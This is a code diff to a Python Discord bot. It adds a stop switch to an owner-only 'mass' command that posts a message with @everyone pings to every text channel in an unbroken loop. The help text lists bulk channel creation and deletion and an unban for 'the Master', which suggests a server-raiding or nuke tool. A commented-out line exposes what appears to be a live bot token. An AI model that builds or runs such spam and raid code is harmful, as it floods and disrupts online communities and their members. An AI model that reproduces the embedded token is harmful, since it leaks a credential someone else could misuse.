@@ -6,13 +6,15 @@ import os
 
 #token = "MTE1NDM1MDIzNzQyMzUyMTg4Mg.Gd77BH.3ayxpbs_OkG_WddxyAy3Qb7rMwpiLI22K80W6I"
 token = os.getenv('DISCORD_BOT_TOKEN')
-#owner_id = 946386383809949756 #dovyrn
-owner_id = 424954210866692099 #uuqq
+owner_id = 946386383809949756 #dovyrn
+#owner_id = 424954210866692099 #uuqq
 imintomen_id = 1142107446458978344
 
 # Define the necessary intents
 intents = discord.Intents.default()
 intents.message_content = True  # Enable message content intent (if needed)
+
+mass_sending = False
 
 bot = commands.Bot(command_prefix=':/', case_insensitive=True, help_command=None, intents=intents)
 
@@ -56,24 +58,33 @@ async def remove(ctx, prefix: str):
 
 @bot.command()
 async def mass(ctx, *, message: str):
+    global mass_sending  # Use the global variable
     if ctx.author.id == owner_id:
         await ctx.message.delete()
-        allow_mentions = discord.AllowedMentions(everyone=True)  # Allow @everyone mention
+        allow_mentions = discord.AllowedMentions(everyone=True)
         guild = ctx.guild
-        while True:
+        
+        mass_sending = True  # Set the flag to true to start mass sending
 
-            # Get all text channels in the guild
+        while mass_sending:  # Check the flag in the loop
             channels = [channel for channel in guild.text_channels]
-
-            # Create a list of tasks for sending messages
             send_tasks = []
             
             for channel in channels:
                 send_tasks.append(channel.send(content=f"{message}", allowed_mentions=allow_mentions))
 
-            # Run all sending tasks concurrently
             await asyncio.gather(*send_tasks)
-            print(f"Sent message '@everyone {message}' to {len(channels)} channels.")
+            print(f"Sent {message}' to {len(channels)} channels.")  # Optional: wait between batches to avoid rate limits
+
+    else:
+        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")
+
+@bot.command()
+async def stop_mass(ctx):
+    global mass_sending  # Use the global variable
+    if ctx.author.id == owner_id:
+        mass_sending = False  # Set the flag to false to stop mass sending
+        await ctx.send("Mass messaging has been stopped.")
     else:
         await ctx.send("This command's power is a tempest, beyond mortal comprehension.")
 
@@ -295,6 +306,7 @@ Admin command:
 - create [channel_name] and [channel_amount]: Creates multiple channels with the same name
 - remove [channel_name]: Deletes all channels that starts with the name
 - mass [message]: Spams [message] in every channel
+- stop_mass: Stops mass
 - ascend:  Ascends Mahodovyron
 - unban: Unbans the Master from the server.
 - state [idle|dnd|online|offline]: Changes the bot's status.
